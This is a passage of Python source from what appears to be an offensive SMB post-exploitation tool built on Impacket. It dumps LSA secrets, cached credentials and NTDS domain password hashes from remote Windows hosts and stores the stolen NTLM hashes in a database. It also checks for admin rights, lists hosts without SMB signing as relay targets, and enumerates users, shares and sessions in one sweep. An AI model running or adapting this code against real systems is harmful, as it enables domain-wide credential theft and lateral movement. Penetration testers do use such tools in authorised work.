        self.enable_remoteops()

        def add_lsa_secret(secret):
            add_lsa_secret.secrets += 1
            self.logger.highlight(secret)
        add_lsa_secret.secrets = 0

        if self.remote_ops and self.bootkey:

            SECURITYFileName = self.remote_ops.saveSECURITY()
            self.logger.success('LSA Secrets dump:')

            LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
                             perSecretCallback=lambda secretType, secret: add_lsa_secret(secret))

            #self.logger.success('Dumping LSA secrets')
            LSA.dumpCachedHashes()
            LSA.exportCached(self.output_filename)
            LSA.dumpSecrets()
            LSA.exportSecrets(self.output_filename)

            self.logger.success('Saved {} LSA secrets to {}.secrets'.format(highlight(add_lsa_secret.secrets),
                                                                            self.output_filename))

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            LSA.finish()

    @requires_admin
    def ntds(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName   = None

        host_id = self.db.get_computers(filterTerm=self.host)[0][0]

        def add_ntds_hash(ntds_hash, host_id):
            """
        
        Args:
            
        Raises:
            
        Returns:

        """
            add_ntds_hash.ntds_hashes += 1
            self.logger.highlight(ntds_hash)
            if ntds_hash.find('$') == -1:
                if ntds_hash.find('\\') != -1:
                    domain, hash = ntds_hash.split('\\')
                else:
                    domain = self.domain
                    hash = ntds_hash

                try:
                    username,_,lmhash,nthash,_,_,_ = hash.split(':')
                    parsed_hash = ':'.join((lmhash, nthash))
                    if validate_ntlm(parsed_hash):
                        self.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)
                        add_ntds_hash.added_to_db += 1
                        return
                    raise
                except:
                    logging.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                logging.debug("Dumped hash is a computer account, not adding to db")
        add_ntds_hash.ntds_hashes = 0
        add_ntds_hash.added_to_db = 0

        if self.remote_ops and self.bootkey:
            try:
                if self.args.ntds is 'vss':
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

                NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=self.args.ntds_history, noLMHash=True,
                                 remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=True,
                                 pwdLastSet=self.args.ntds_pwdLastSet, resumeSession=None, outputFileName=self.output_filename,
                                 justUser=None, printUserStatus=self.args.ntds_status,
                                 perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))

                self.logger.success('Dumping the NTDS, this could take a while so go grab a redbull...')
                NTDS.dump()

                self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds',
                                                                                                                highlight(add_ntds_hash.added_to_db)))

            except Exception as e:
                #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                #    resumeFile = NTDS.getResumeSessionFile()
                #    if resumeFile is not None:
                #        os.unlink(resumeFile)
                self.logger.error(e)

            try:
                self.remote_ops.finish()
            except Exception as e:
                logging.debug("Error calling remote_ops.finish(): {}".format(e))

            NTDS.finish()


#    def dcsync(self):
#        try:
#            stringBinding = r'ncacn_ip_tcp:{}[445]'.format(self.dc_ip)
#            transport = DCERPCTransportFactory(stringBinding)
#            transport.set_connect_timeout(5)
#            dce = transport.get_dce_rpc()
#            dce.connect()
#            try:
#                dce.bind(MSRPC_UUID_DRSUAPI)
#                try:
#                    resp = samr.hSamrLookupDomainInSamServer(dce)
#                    if self.debug:
#                        resp.dump()
#                    domain_sid = resp['DomainId']
#                    try:
#                        resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
#                        logging.debug('Dump of hSamrOpenDomain response:')
#                        if self.debug:
#                            resp.dump()
#                        domainHandle = resp['DomainHandle']
#    
#                    except DCERPCException as e:
#                        logging.debug('a {}'.format(str(e)))
#                        dce.disconnect()
#                        pass          
#                except DCERPCException as e:
#                    logging.debug('b {}'.format(str(e)))
#                    dce.disconnect()
#                    pass
#            except DCERPCException as e:
#                logging.debug('c {}'.format(str(e)))
#                dce.disconnect()
#                pass
#        except DCERPCException as e:
#            logging.debug('c {}'.format(str(e)))
#            dce.disconnect()
#            pass



####################################################################################
####################################################################################

    #     #    #######    #          ######     #######    ######      #####  
    #     #    #          #          #     #    #          #     #    #     # 
    #     #    #          #          #     #    #          #     #    #       
    #######    #####      #          ######     #####      ######      #####  
    #     #    #          #          #          #          #   #            # 
    #     #    #          #          #          #          #    #     #     # 
    #     #    #######    #######    #          #######    #     #     #####  
                                                                         
####################################################################################
#   Helper / Misc functions
#
# This section:
#   print_host_info
#   get_os_arch
#   check_if_admin
#   enable_remoteops
#   get_dc_ips
#   domainfromdsn
#   gen_relay_list
#
#   all
####################################################################################


    def print_host_info(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        self.logger.info("{}{} (domain:{}) (signing:{}) (SMBv:{})".format(self.server_os,
                                                                                      ' x{}'.format(self.os_arch) if self.os_arch else '',
                                                                                      self.domain,
                                                                                      self.signing,
                                                                                      self.smbv))


    def get_os_arch(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except DCERPCException as e:
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64

        except Exception as e:
            logging.debug('Error retrieving os arch of {}: {} using x64'.format(self.host, str(e)))

        try:
            dce.disconnect()
        except DCERPCException as e:
            pass

        return 64


    def check_if_admin(self):
        """Check for localadmin privs

        Checked by view all services for sc_manager_all_access
        
        Args:
            
        Raises: 
            exceptions when the connection or binding fails
            
        Returns:
            True if localadmin
            False if not localadmin
        """

        try:
            rpctransport = transport.SMBTransport(self.host, 445, r'\svcctl', smb_connection=self.conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            try:
                logging.debug('localadmin Binding start')
                dce.bind(scmr.MSRPC_UUID_SCMR)
                try:
                    # 0xF003F - SC_MANAGER_ALL_ACCESS
                    # this val comes from https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights
                    # https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/scmr.py

                    logging.debug('Verify localadmin via ServicesActive...')
                    ans = scmr.hROpenSCManagerW(dce,'{}\x00'.format(self.hostname),'ServicesActive\x00', 0xF003F)
                    logging.debug('pewpewpewPwned baby')
                    dce.disconnect()
                    return True
                except DCERPCException:
                    logging.debug('a {}'.format(str(e)))
                    dce.disconnect()
                    pass
            except DCERPCException as e:
                logging.debug('b {}'.format(str(e)))
                dce.disconnect()
                return False
        except Exception:
            logging.debug('Something went wrong ... Not localadmin :( ')
            dce.disconnect()
            return False

        dce.disconnect()
        return False


    def enable_remoteops(self):
        """Enable remote operations on a target host

        Args:
            
        Raises:
            
        Returns:

        """
        if self.remote_ops is not None and self.bootkey is not None:
            return

        try:
            self.remote_ops  = RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.error('RemoteOperations failed: {}'.format(e))

    def get_dc_ips(self):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        dc_ips = []

        #for dc in self.db.get_domain_controllers(domain=self.domain):
        #    dc_ips.append(dc[1])

        if self.args.domaincontroller:
            dc_ips.append(self.args.domaincontroller)

        if self.args.domain:
            if not self.args.domaincontroller:
                dc_ips.append(self.args.domain.upper())

        return dc_ips

    def domainfromdsn(self, dsn):
        """
        
        Args:
            
        Raises:
            
        Returns:

        """
        dsnparts = dsn.split(',')
        domain = ""
        for part in dsnparts:
            k,v = part.split("=")
            if k == "DC":
                if domain=="":
                    domain = v
                else:
                    domain = domain+"."+v
        return domain


    def gen_relay_list(self):
        """Generates a list of hosts that can be relayed too
        Checks for smb signing on hosts.

        Args:
            
        Raises:
            
        Returns:
            Nothing, but
            outputs to a filename (passed in after the option)
        """

        if self.server_os.lower().find('windows') != -1 and self.signing is False:
            with sem:
                with open(self.args.gen_relay_list, 'a+') as relay_list:
                    if self.host not in relay_list.read():
                        relay_list.write(self.host + '\n')
           


###############################################################################
###############################################################################

###############################################################################
###############################################################################


    @requires_admin
    @requires_dc
    def all(self):
        """Testing/debugging Function to execute multiple enum functions in one shot
        
        Args:
            
        Raises:
            
        Returns:

        """

        print('')
        self.logger.announce("Running sessions,loggedon,rid-brute,disks,shares,local+domain users/groups/computers, and dumping SAM")
        print('')

        self.sessions()
        self.loggedon()
        time.sleep(1)

        self.local_users()
        time.sleep(1)

        self.local_groups()
        self.rid_brute(maxRid=4000)
        time.sleep(1)

        self.disks()
        self.shares()
        time.sleep(1)

        self.users()
        time.sleep(1)

        self.groups()
        time.sleep(1)

        self.computers()
        time.sleep(1)

        self.sam()

        #time.sleep(3)        #tried sleeping between sam/lsa. still only rarely works. something about the connection gets killed between the two
        #self.lsa()                    #might be something to do with remoteops start/kill
        print('')
        self.logger.announce("HACKED HACKED HACKED HACKED HACKED HACKED HACKED HACKED")
